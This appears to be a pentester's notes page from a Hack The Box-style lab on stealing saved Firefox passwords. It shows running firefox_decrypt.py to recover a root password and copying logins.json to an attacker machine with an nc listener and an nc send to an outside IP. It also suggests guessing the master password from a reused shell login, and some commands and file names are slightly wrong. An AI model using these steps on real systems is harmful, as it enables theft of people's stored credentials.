<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Firefox</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Firefox</h1></strong><br /><br /><strong><h2>## Find saved passwords in .mozilla</h2></strong><br /><code>.mozilla</code> is in the home directory and contains <code>logins.json</code> and <code>key.db</code>.<br /><br /><code>logins.json</code> contains encrypted logins <br /><code>key4.db</code> contains encrypted keys:<br /><a href="https://support.mozilla.org/en-US/questions/1181061">https://support.mozilla.org/en-US/questions/1181061</a><br /><br /><strong><h3>### firefox_decrypt.py</h3></strong><br /><a href="https://github.com/unode/firefox_decrypt">https://github.com/unode/firefox_decrypt</a> <br />This script can decrypt <code>logins.json</code> and <code>key4.db</code> providing we know the master password<br />(try using the user&#39;s shell login as their master password, they might be dumb and have reused their password).<br /><br /><code>firefox_decrypt.py</code> wants a profile, so change directory into the .mozilla directory. <br />The <code>.default</code> files are the profiles.<br /><br /><code>wget https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py</code><br /><br /><div class="codebox"><div class="codebox">ayush@chaos:~/.mozilla/firefox$&nbsp;python3&nbsp;firefox_decrypt.py<br /><br />Master&nbsp;Password&nbsp;for&nbsp;profile&nbsp;/home/ayush/.mozilla/firefox/bzo7sjt1.default:&nbsp;jiujitsu<br /><br />Website:&nbsp;&nbsp;&nbsp;https://chaos.htb:10000<br />Username:&nbsp;&#39;root&#39;<br />Password:&nbsp;&#39;Thiv8wrej~&#39;</div></div><br /><br /><strong><h3>### Don&#39;t know master password?</h3></strong><br />I don&#39;t know whether this works reliably.<br /><br />Copy the <code>logins.json</code> and <code>key.db</code> files to your local machine, <br />and overwrite your own copies of those files in your firefox profile with the versions you&#39;ve just stolen.<br /><br /><code>root@kali:~# nc -lvnp 5556 &gt; logins.json<br />ayush@chaos:~/.mozilla/firefox/bzo7sjt1.default$ nc 10.10.13.44 5556 &gt; logins.json</code><br /><br />Now if you check the <code>Saved Logins</code> in Firefox on your attacking machine after replacing the <code>logins.json</code> file (and <code>key.db</code>?), you should see another other user&#39;s saved logins (not yours).<br /><a href=""><img src="images/306-1.png" alt="images/306-1.png" /></a><br /><br /></div>
</body>
</html>
